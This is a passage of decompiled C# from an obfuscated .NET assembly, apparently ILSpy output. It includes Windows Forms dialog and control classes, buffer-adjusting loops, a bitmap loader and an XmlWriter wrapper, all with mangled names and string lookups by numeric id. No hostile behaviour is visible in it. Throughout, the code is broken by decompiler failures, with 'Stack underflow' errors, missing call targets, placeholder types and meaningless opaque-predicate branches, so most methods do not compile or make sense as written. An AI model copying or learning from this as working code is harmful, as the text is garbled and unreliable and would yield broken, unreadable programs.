				int num2 = ((global::_0008._0004._0008)/*Error near IL_005d: Stack underflow*/)._0005;
				((global::_0008._0004._0008)/*Error near IL_0068: Stack underflow*/)._0005 = num2 - 32768;
				int num3 = P_0._0004;
				((global::_0008._0004._0008)/*Error near IL_007e: Stack underflow*/)._0004 = num3 - 32768;
				*(int*)ptr = 0;
				while (*(int*)ptr < 32768)
				{
					*(int*)((byte*)ptr + 4) = P_0._0001[*(int*)ptr] & 0xFFFF;
					P_0._0001[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
					(*(int*)ptr)++;
				}
				*(int*)((byte*)ptr + 8) = 0;
				while (*(int*)((byte*)ptr + 8) < 32768)
				{
					*(int*)((byte*)ptr + 12) = P_0._0002[*(int*)((byte*)ptr + 8)] & 0xFFFF;
					P_0._0002[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
					(*(int*)((byte*)ptr + 8))++;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)P_0);
				throw;
			}
		}

		static int _0001(global::_0008._0004._000F P_0)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			try
			{
				if (4u != 0)
				{
					_0011._0001((global::_0008._0004._000F)/*Error near IL_0021: Stack underflow*/);
					do
					{
						_0011._0001((global::_0008._0004._000F)/*Error near IL_002b: Stack underflow*/);
						do
						{
							_ = /*Error near IL_000e: Stack underflow*/<< 16;
						}
						while (false);
						_ = /*Error near IL_0012: Stack underflow*/| /*Error near IL_0012: Stack underflow*/;
					}
					while (false);
					int num = (int)/*Error near IL_002e: Stack underflow*/;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_003b: Stack underflow*/;
		}

		[DllImport("user32.dll", EntryPoint = "GetSystemMetrics")]
		static extern int _0001(int P_0);

		static void _0001(global::_0008._0004._0003 P_0, int P_1)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I4, but got Unknown
			//IL_001b: Invalid comparison between Unknown and I4
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 2
			//IL_006e: Incompatible stack heights: 0 vs 1
			int num = default(int);
			try
			{
				num = ((global::_0008._0004._0003)/*Error near IL_0009: Stack underflow*/)._0002;
				_003F val = /*Error near IL_000f: Stack underflow*/+ 1;
				((global::_0008._0004._0003)/*Error near IL_0014: Stack underflow*/)._0002 = (int)val;
				if ((int)/*Error near IL_001d: Stack underflow*/ == 32768)
				{
					new InvalidOperationException();
					throw /*Error near IL_0020: Stack underflow*/;
				}
				_ = ((global::_0008._0004._0003)/*Error near IL_0027: Stack underflow*/)._0001;
				num = ((global::_0008._0004._0003)/*Error near IL_0030: Stack underflow*/)._0001;
				((global::_0008._0004._0003)/*Error near IL_0039: Stack underflow*/)._0001 = num + 1;
				((sbyte[])/*Error near IL_003d: Stack underflow*/)[num] = (sbyte)(byte)P_1;
				P_0._0001 &= 32767;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)P_0, (object)P_1);
				throw;
			}
		}

		static int _0001(global::_0002._0005._0003 P_0, global::_0002._0005 P_1)
		{
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 2
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_0086: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 2
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_0099: Incompatible stack heights: 0 vs 1
			//IL_009c: Incompatible stack heights: 0 vs 2
			//IL_00a3: Incompatible stack heights: 0 vs 1
			while (true)
			{
				_ = global::_0007._007E_008B;
				string text = ((global::_0002._0005._0003)/*Error near IL_000c: Stack underflow*/)._0001._0001;
				/*Error near IL_007a: Stack underflow*/(text);
				string key = (string)/*Error near IL_0080: Stack underflow*/;
				while (0 == 0)
				{
					if (0 == 0)
					{
						_ = ((global::_0002._0005)/*Error near IL_0028: Stack underflow*/)._0002;
						((Dictionary<string, int>)/*Error near IL_0093: Stack underflow*/).ContainsKey((string)/*Error near IL_0093: Stack underflow*/);
						if (6u != 0)
						{
							if ((int)/*Error near IL_0031: Stack underflow*/ != 0)
							{
								_ = ((global::_0002._0005)/*Error near IL_0038: Stack underflow*/)._0002;
								_ = ((Dictionary<string, int>)/*Error near IL_00a3: Stack underflow*/)[(string)/*Error near IL_00a3: Stack underflow*/];
								return (int)/*Error near IL_003d: Stack underflow*/;
							}
							if (false)
							{
								continue;
							}
							int count = P_1._0001.Count;
							if (false)
							{
								break;
							}
							P_1._0001.Add(P_0._0001);
							P_1._0002.Add(key, count);
						}
					}
					return (int)/*Error near IL_006f: Stack underflow*/;
				}
			}
		}

		static void _0001()
		{
			//IL_0097: Incompatible stack heights: 0 vs 2
			//IL_00a1: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 2
			//IL_00c1: Incompatible stack heights: 0 vs 1
			//IL_00cb: Incompatible stack heights: 0 vs 1
			//IL_00d5: Incompatible stack heights: 0 vs 1
			Version version = default(Version);
			try
			{
				try
				{
					do
					{
						if (4u != 0)
						{
							_0011._0001();
							goto IL_0008;
						}
						goto IL_004c;
						IL_0008:
						_ = _009D._007E_009C_0003;
						_009C._009B_0003();
						/*Error near IL_00a1: Stack underflow*/((object)/*Error near IL_00a1: Stack underflow*/);
						_0011._0001((Version)/*Error near IL_00ab: Stack underflow*/);
						version = (Version)/*Error near IL_00b1: Stack underflow*/;
						if (uint.MaxValue != 0)
						{
							_ = global::_0004._0019;
							global::_000E._0003._0001(107390800);
							_0011._0001((Version)/*Error near IL_00cb: Stack underflow*/);
							/*Error near IL_00d5: Stack underflow*/((string)/*Error near IL_00d5: Stack underflow*/, (string)/*Error near IL_00d5: Stack underflow*/);
							global::_0010._0006._0001((string)/*Error near IL_004c: Stack underflow*/);
							goto IL_004c;
						}
						goto IL_0071;
						IL_004c:
						if (false)
						{
							goto IL_0008;
						}
						if (0 == 0)
						{
							global::_0010._0006._0001(global::_0004._0019(global::_000E._0003._0001(107390783), _0011._0001(version)));
							goto IL_0071;
						}
						continue;
						IL_0071:
						global::_0010._0006._0001();
					}
					while (3 == 0);
					_0011._0001();
					_0011._0001();
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)version);
				throw;
			}
		}

		static void _0001(global::_0004._000E P_0)
		{
			//IL_02fd: Incompatible stack heights: 0 vs 2
			//IL_030d: Incompatible stack heights: 0 vs 2
			//IL_031d: Incompatible stack heights: 0 vs 2
			//IL_032d: Incompatible stack heights: 0 vs 2
			//IL_0337: Incompatible stack heights: 0 vs 2
			_ = global::_000F._0007_0002;
			/*Error near IL_0307: Stack underflow*/((object)/*Error near IL_0307: Stack underflow*/);
			_ = _0001_0003._007E_008E_0005;
			Button obj = ((global::_0004._000E)/*Error near IL_0020: Stack underflow*/)._0002;
			/*Error near IL_0317: Stack underflow*/(obj, (AnchorStyles)10);
			_ = _0002_0003._007E_008F_0005;
			Button obj2 = ((global::_0004._000E)/*Error near IL_0037: Stack underflow*/)._0002;
			/*Error near IL_0327: Stack underflow*/(obj2, (FlatStyle)3);
			_ = _0004_0003._007E_0092_0005;
			_ = ((global::_0004._000E)/*Error near IL_004d: Stack underflow*/)._0002;
			new Size(100, 24);
			/*Error near IL_0341: Stack underflow*/((object)/*Error near IL_0341: Stack underflow*/, (Size)/*Error near IL_0341: Stack underflow*/);
			_0003_0003._007E_0091_0005(P_0._0002, new Point(408 - global::_0001._007E_0012(P_0._0002), 188));
			_0090_0002._007E_0016_0005(P_0._0002, 0);
			global::_0011._007E_007F_0002(P_0._0002, global::_000E._0003._0001(107390722));
			_008B_0002._007E_000F_0005(P_0._0002, P_0._0002);
			_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)10);
			_0002_0003._007E_008F_0005(P_0._0001, (FlatStyle)3);
			_0004_0003._007E_0092_0005(P_0._0001, new Size(100, 24));
			_0003_0003._007E_0091_0005(P_0._0001, new Point(global::_0001._007E_0013(P_0._0002) - global::_0001._007E_0012(P_0._0001) - 6, 188));
			_0090_0002._007E_0016_0005(P_0._0001, 1);
			do
			{
				global::_0011._007E_007F_0002(P_0._0001, global::_000E._0003._0001(107390745));
				_008B_0002._007E_000F_0005(P_0._0001, P_0._0001);
				_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)6);
				_0008_0003._007E_009B_0005(P_0._0001, 6, 186, 120, 32);
				_0011._0001(P_0._0001, global::_0003._0007._0003);
				_0001_0003._007E_008E_0005(P_0._0001, (AnchorStyles)13);
				_0003_0003._007E_0091_0005(P_0._0001, new Point(20, 72));
			}
			while (8 == 0);
			_0004_0003._007E_0092_0005(P_0._0001, new Size(382, 13));
			_0004_0003._007E_0093_0005(P_0, new Size(5, 13));
			_0004_0003._0094_0005(P_0, new Size(418, 224));
			_0084_0002._0094_0004(P_0, false);
			_000F_0003._007E_009D_0005(_000E_0003._009C_0005(P_0), (Control[])(object)new Control[5]
			{
				P_0._0001,
				(Control)P_0._0001,
				(Control)P_0._0002,
				P_0._0001,
				(Control)P_0._0001
			});
			_0010_0003._009E_0005(P_0, (FormBorderStyle)1);
			_0084_0002._0097_0004(P_0, false);
			_0084_0002._0096_0004(P_0, false);
			_0084_0002._0095_0004(P_0, false);
			_0011_0003._009F_0005(P_0, (FormStartPosition)1);
			_0084_0002._0099_0004(P_0, false);
		}

		static Bitmap _0001(string P_0)
		{
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0089._007E_000F_0003;
				_0088._000E_0003();
				_ = _0019._0098_0002;
				global::_000E._0003._0001(107391744);
				global::_000E._0003._0001(107391628);
				/*Error near IL_0055: Stack underflow*/((string)/*Error near IL_0055: Stack underflow*/, (string)/*Error near IL_0055: Stack underflow*/, (string)/*Error near IL_0055: Stack underflow*/);
				/*Error near IL_005c: Stack underflow*/((object)/*Error near IL_005c: Stack underflow*/, (string)/*Error near IL_005c: Stack underflow*/);
				Stream stream = (Stream)/*Error near IL_005f: Stack underflow*/;
				return ((int)/*Error near IL_002b: Stack underflow*/ == 0) ? ((Bitmap)null) : new Bitmap((Stream)/*Error near IL_0032: Stack underflow*/);
			}
			catch
			{
				return null;
			}
		}
	}
}
namespace _0004
{
	internal sealed class _0007 : IDisposable
	{
		private readonly XmlWriter m__0001;

		public _0007(XmlWriter P_0, string P_1)
		{
			this.m__0001 = P_0;
			this.m__0001.WriteStartElement(P_1);
		}

		public void _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = global::_000F._007E_0012_0002;
			XmlWriter xmlWriter = ((_0007)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0017: Stack underflow*/(xmlWriter);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0006
{
	internal sealed class _0005 : Label
	{
		protected override void _0001(EventArgs P_0)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0012_0004._0005_0007;
			/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, (EventArgs)/*Error near IL_001b: Stack underflow*/);
			global::_0005._0011._0001((_0005)/*Error near IL_0025: Stack underflow*/);
		}

		protected override void _0002(EventArgs P_0)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0012_0004._0006_0007;
			/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, (EventArgs)/*Error near IL_001b: Stack underflow*/);
			global::_0005._0011._0001((_0005)/*Error near IL_0025: Stack underflow*/);
		}

		protected override void _0003(EventArgs P_0)
		{
			//IL_0011: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0012_0004._0007_0007;
			/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, (EventArgs)/*Error near IL_001b: Stack underflow*/);
			global::_0005._0011._0001((_0005)/*Error near IL_0025: Stack underflow*/);
		}

		public _0005()
		{
			((Label)this).set_FlatStyle((FlatStyle)3);
			((Label)this).set_UseMnemonic(false);
		}
	}
}
namespace _0005
{
	internal sealed class _0008 : Control
	{
		private readonly Label m__0001 = new Label();

		internal Image _0001;

		internal bool _0001;

		internal readonly Timer _0001 = new Timer();

		internal bool _0002 = true;

		internal string _0001 = string.Empty;

		private float m__0001 = 1f;

		private float _0002 = 1f;

		[SpecialName]
		public override string _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 2
			//IL_0012: Incompatible stack heights: 0 vs 1
			_ = global::_0007._008F;
			/*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/);
			return (string)/*Error near IL_000a: Stack underflow*/;
		}

		[SpecialName]
		public override void _0001(string P_0)
		{
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			_ = global::_0011._007F_0002;
			/*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/, (string)/*Error near IL_0020: Stack underflow*/);
			_ = global::_000F._007E_0001_0002;
			/*Error near IL_002a: Stack underflow*/((object)/*Error near IL_002a: Stack underflow*/);
		}

		protected override void _0001(EventArgs P_0)
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Unknown result type (might be due to invalid IL or missing references)
			//IL_004b: Unknown result type (might be due to invalid IL or missing references)
			//IL_006d: Expected I4, but got Unknown
			//IL_007b: Incompatible stack heights: 0 vs 2
			//IL_0081: Incompatible stack heights: 0 vs 4
			//IL_008b: Expected F4, but got Unknown
			//IL_008b: Incompatible stack heights: 0 vs 1
			//IL_0091: Incompatible stack heights: 0 vs 2
			//IL_0098: Incompatible stack heights: 0 vs 1
			//IL_009b: Incompatible stack heights: 0 vs 2
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a5: Incompatible stack heights: 0 vs 3
			//IL_00ac: Expected F4, but got Unknown
			//IL_00ac: Incompatible stack heights: 0 vs 1
			_ = _0008_0003._007E_009B_0005;
			_ = ((_0008)/*Error near IL_000c: Stack underflow*/).m__0001;
			_ = _0013_0004._000F_0007;
			_ = 22f;
			float num = ((_0008)/*Error near IL_001d: Stack underflow*/).m__0001;
			_003F val = /*Error near IL_001e: Stack underflow*/* num;
			/*Error near IL_008b: Stack underflow*/((float)val);
			_ = _0013_0004._000F_0007;
			float num2 = ((_0008)/*Error near IL_002c: Stack underflow*/)._0002;
			/*Error near IL_0098: Stack underflow*/(num2);
			_ = global::_0001._0012;
			/*Error near IL_00a2: Stack underflow*/((object)/*Error near IL_00a2: Stack underflow*/);
			_ = _0013_0004._000F_0007;
			_ = 22f;
			float num3 = ((_0008)/*Error near IL_0048: Stack underflow*/).m__0001;
			_003F val2 = /*Error near IL_0049: Stack underflow*/* num3;
			/*Error near IL_00ac: Stack underflow*/((float)val2);
			_003F val3 = /*Error near IL_004c: Stack underflow*/- /*Error near IL_004c: Stack underflow*/;
			int num4 = global::_0001._0015(this);
			int num5 = _0013_0004._000F_0007(_0002);
			/*Error near IL_006d: Stack underflow*/((object)/*Error near IL_006d: Stack underflow*/, (int)/*Error near IL_006d: Stack underflow*/, (int)/*Error near IL_006d: Stack underflow*/, (int)val3, num4 - num5);
			_0012_0004._0006_0007(this, P_0);
		}

		protected override void _0001(float P_0, float P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (uint.MaxValue != 0)
				{
					((_0008)/*Error near IL_000c: Stack underflow*/).m__0001 = (float)/*Error near IL_000c: Stack underflow*/;
					((_0008)/*Error near IL_0015: Stack underflow*/)._0002 = (float)/*Error near IL_0015: Stack underflow*/;
					_ = _0014_0004._0010_0007;
					/*Error near IL_0057: Stack underflow*/((object)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/);
				}
				while (true)
				{
					_ = _0012_0004._007E_0006_0007;
					EventArgs empty = EventArgs.Empty;
					/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, empty);
					if (0 == 0)
					{
						if (false)
						{
							break;
						}
						if (5u != 0)
						{
							return;
						}
					}
				}
			}
		}

		protected override void _0001(PaintEventArgs P_0)
		{
			//IL_012d: Incompatible stack heights: 0 vs 2
			//IL_0133: Incompatible stack heights: 0 vs 1
			//IL_0143: Incompatible stack heights: 0 vs 2
			//IL_014d: Incompatible stack heights: 0 vs 1
			//IL_0153: Incompatible stack heights: 0 vs 1
			//IL_015d: Incompatible stack heights: 0 vs 1
			//IL_0167: Incompatible stack heights: 0 vs 1
			//IL_016d: Incompatible stack heights: 0 vs 1
			_ = _0015_0004._0011_0007;
			/*Error near IL_013d: Stack underflow*/((object)/*Error near IL_013d: Stack underflow*/, (PaintEventArgs)/*Error near IL_013d: Stack underflow*/);
			_ = _008D._0080_0003;
			/*Error near IL_014d: Stack underflow*/((object)/*Error near IL_014d: Stack underflow*/);
			if ((int)/*Error near IL_0025: Stack underflow*/ != 0)
			{
				global::_000E._0003._0001(107393289);
				_0011._0001((string)/*Error near IL_0167: Stack underflow*/);
				((_0008)/*Error near IL_003e: Stack underflow*/)._0001 = (Image)/*Error near IL_003e: Stack underflow*/;
				((_0008)/*Error near IL_0049: Stack underflow*/)._0001 = true;
			}
			if (this._0001 != null && this._0002)
			{
				_0016_0004._007E_0012_0007(_009D_0003._007E_0095_0006(P_0), this._0001, new Rectangle(0, 0, _0013_0004._000F_0007(16f * this.m__0001), _0013_0004._000F_0007(16f * _0002)), new Rectangle(0, 0, 16, 16), (GraphicsUnit)2);
			}
			if (this._0001)
			{
				((Control)this.m__0001).set_Text((global::_0001._007E_0001(this._0001) > 0) ? _0017_0004._0013_0007(global::_0007._008F(this), global::_000E._0003._0001(107390188), this._0001, global::_000E._0003._0001(107390183)) : global::_0007._008F(this));
			}
			else
			{
				global::_0011._007E_007F_0002(this.m__0001, string.Empty);
			}
		}

		public _0008()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			this._0001.set_Interval(250);
			this._0001.add_Tick((EventHandler)_0001);
			this.m__0001.set_FlatStyle((FlatStyle)3);
			((Control)this).get_Controls().Add((Control)(object)this.m__0001);
			((Control)this).SetStyle((ControlStyles)75794, true);
			((Control)this).set_TabStop(false);
		}

		public _0008(string P_0)
			: this()
		{
			((Control)this).set_Text(global::_000E._0003._0001(107396328) + P_0);
		}

		protected override void _0001(bool P_0)
		{
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 2
			//IL_0055: Incompatible stack heights: 0 vs 2
			//IL_005f: Incompatible stack heights: 0 vs 2
			//IL_0062: Incompatible stack heights: 0 vs 1
			while ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				while (0 == 0 || 1 == 0)
				{
					if (((_0008)/*Error near IL_0011: Stack underflow*/)._0001 != null)
					{
						goto IL_0013;
					}
					goto IL_0024;
					IL_0024:
					if (false)
					{
						goto IL_0013;
					}
					goto IL_0027;
					IL_0013:
					if (4 == 0)
					{
						continue;
					}
					_ = global::_000F._007E_0013_0002;
					Image obj = ((_0008)/*Error near IL_0022: Stack underflow*/)._0001;
					/*Error near IL_0052: Stack underflow*/(obj);
					goto IL_0024;
				}
				continue;
				IL_0027:
				_ = global::_000F._007E_0014_0002;
				Timer obj2 = ((_0008)/*Error near IL_0033: Stack underflow*/)._0001;
				if (4u != 0)
				{
					/*Error near IL_005c: Stack underflow*/(obj2);
				}
				break;
			}
			_ = _0084_0002._0001_0005;
			/*Error near IL_0069: Stack underflow*/((object)/*Error near IL_0069: Stack underflow*/, (byte)/*Error near IL_0069: Stack underflow*/ != 0);
		}

		private void _0001(object P_0, EventArgs P_1)
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			bool num = ((_0008)/*Error near IL_0009: Stack underflow*/)._0002;
			((_0008)/*Error near IL_0011: Stack underflow*/)._0002 = !num;
			_ = global::_000F._007E_0001_0002;
			/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/);
		}
	}
}
namespace _0004
{
	internal sealed class _0008 : Control
	{
		private Label m__0001 = new Label();

		private Image m__0001;

		private Icon m__0001;

		internal Bitmap _0001;

		internal global::_0003._0007 _0001;

		private float m__0001 = 1f;

		private float m__0002 = 1f;

		[SpecialName]
		public override string _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = global::_0007._007E_008F;
			Label obj = ((_0008)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0017: Stack underflow*/(obj);
			return (string)/*Error near IL_000f: Stack underflow*/;
		}

		[SpecialName]
		public override void _0001(string P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0015: Incompatible stack heights: 0 vs 2
			_ = _0011._007E_007F_0002;
			_ = ((_0008)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, (string)/*Error near IL_001c: Stack underflow*/);
		}

		protected override void _0001(bool P_0)
		{
			//IL_0093: Incompatible stack heights: 0 vs 1
			//IL_0099: Incompatible stack heights: 0 vs 1
			//IL_009f: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 2
			//IL_00c5: Incompatible stack heights: 0 vs 1
			if (4u != 0)
			{
				if ((int)/*Error near IL_000d: Stack underflow*/ == 0)
				{
					goto IL_0085;
				}
				if (4 == 0 || 1 == 0)
				{
					goto IL_006e;
				}
				if (((_0008)/*Error near IL_001d: Stack underflow*/).m__0001 != null)
				{
					_ = global::_000F._007E_0015_0002;
					Icon obj = ((_0008)/*Error near IL_002e: Stack underflow*/).m__0001;
					/*Error near IL_00a9: Stack underflow*/(obj);
					if (false)
					{
						return;
					}
					((_0008)/*Error near IL_0041: Stack underflow*/).m__0001 = null;
				}
				if (((_0008)/*Error near IL_004b: Stack underflow*/).m__0001 != null)
				{
					if (5 == 0)
					{
						return;
					}
					_ = global::_000F._007E_0013_0002;
					Image obj2 = ((_0008)/*Error near IL_005c: Stack underflow*/).m__0001;
					/*Error near IL_00c2: Stack underflow*/(obj2);
					((_0008)/*Error near IL_0066: Stack underflow*/).m__0001 = null;
				}
			}
			if (this._0001 != null)
			{
				goto IL_006e;
			}
			goto IL_0085;
			IL_006e:
			global::_000F._007E_0013_0002(this._0001);
			this._0001 = null;
			goto IL_0085;
			IL_0085:
			_0084_0002._0001_0005(this, P_0);
		}

		protected override void _0001(EventArgs P_0)
		{
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_0057: Unknown result type (might be due to invalid IL or missing references)
			//IL_007f: Expected I4, but got Unknown
			//IL_008d: Incompatible stack heights: 0 vs 2
			//IL_0093: Incompatible stack heights: 0 vs 4
			//IL_009d: Expected F4, but got Unknown
			//IL_009d: Incompatible stack heights: 0 vs 1
			//IL_00a3: Incompatible stack heights: 0 vs 3
			//IL_00ad: Expected F4, but got Unknown
			//IL_00ad: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 2
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c0: Incompatible stack heights: 0 vs 3
			//IL_00c7: Expected F4, but got Unknown
			//IL_00c7: Incompatible stack heights: 0 vs 1
			_ = _0008_0003._007E_009B_0005;
			_ = ((_0008)/*Error near IL_000f: Stack underflow*/).m__0001;
			_ = _0013_0004._000F_0007;
			_ = 13f;
			float num = ((_0008)/*Error near IL_0020: Stack underflow*/).m__0001;
			_003F val = /*Error near IL_0021: Stack underflow*/* num;
			/*Error near IL_009d: Stack underflow*/((float)val);
			_ = _0013_0004._000F_0007;
			_ = 15f;
			float num2 = ((_0008)/*Error near IL_0037: Stack underflow*/).m__0002;
			_003F val2 = /*Error near IL_0038: Stack underflow*/* num2;
			/*Error near IL_00ad: Stack underflow*/((float)val2);
			_ = global::_0001._0012;
			/*Error near IL_00ba: Stack underflow*/((object)/*Error near IL_00ba: Stack underflow*/);
			_ = _0013_0004._000F_0007;
			_ = 69f;
			float num3 = ((_0008)/*Error near IL_0054: Stack underflow*/).m__0001;
			_003F val3 = /*Error near IL_0055: Stack underflow*/* num3;
			/*Error near IL_00c7: Stack underflow*/((float)val3);
			_003F val4 = /*Error near IL_0058: Stack underflow*/- /*Error near IL_0058: Stack underflow*/;
			int num4 = global::_0001._0015(this);
			int num5 = _0013_0004._000F_0007(18f * this.m__0002);
			/*Error near IL_007f: Stack underflow*/((object)/*Error near IL_007f: Stack underflow*/, (int)/*Error near IL_007f: Stack underflow*/, (int)/*Error near IL_007f: Stack underflow*/, (int)val4, num4 - num5);
			_0012_0004._0006_0007(this, P_0);
		}

		protected override void _0001(float P_0, float P_1)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (uint.MaxValue != 0)
				{
					((_0008)/*Error near IL_000c: Stack underflow*/).m__0001 = (float)/*Error near IL_000c: Stack underflow*/;
					((_0008)/*Error near IL_0015: Stack underflow*/).m__0002 = (float)/*Error near IL_0015: Stack underflow*/;
					_ = _0014_0004._0010_0007;
					/*Error near IL_0057: Stack underflow*/((object)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/, (float)/*Error near IL_0057: Stack underflow*/);
				}
				while (true)
				{
					_ = _0012_0004._007E_0006_0007;
					EventArgs empty = EventArgs.Empty;
					/*Error near IL_0033: Stack underflow*/((object)/*Error near IL_0033: Stack underflow*/, empty);
					if (0 == 0)
					{
						if (false)
						{
							break;
						}
						if (5u != 0)
						{
							return;
						}
					}
				}
			}
		}

		protected override void _0001(PaintEventArgs P_0)
		{
			//IL_0246: Incompatible stack heights: 0 vs 2
			//IL_024c: Incompatible stack heights: 0 vs 1
			//IL_025c: Incompatible stack heights: 0 vs 3
			//IL_0266: Incompatible stack heights: 0 vs 1
			//IL_0270: Incompatible stack heights: 0 vs 1
			//IL_0276: Incompatible stack heights: 0 vs 3
			//IL_0280: Incompatible stack heights: 0 vs 1
			_ = _0015_0004._0011_0007;
			/*Error near IL_0256: Stack underflow*/((object)/*Error near IL_0256: Stack underflow*/, (PaintEventArgs)/*Error near IL_0256: Stack underflow*/);
			_ = _0019_0004._007E_0016_0007;
			_ = _009D_0003._007E_0095_0006;
			/*Error near IL_0266: Stack underflow*/((object)/*Error near IL_0266: Stack underflow*/);
			_0018_0004._0014_0007();
			_ = 0;
			_ = _0007_0003._009A_0005;
			/*Error near IL_0280: Stack underflow*/((object)/*Error near IL_0280: Stack underflow*/);
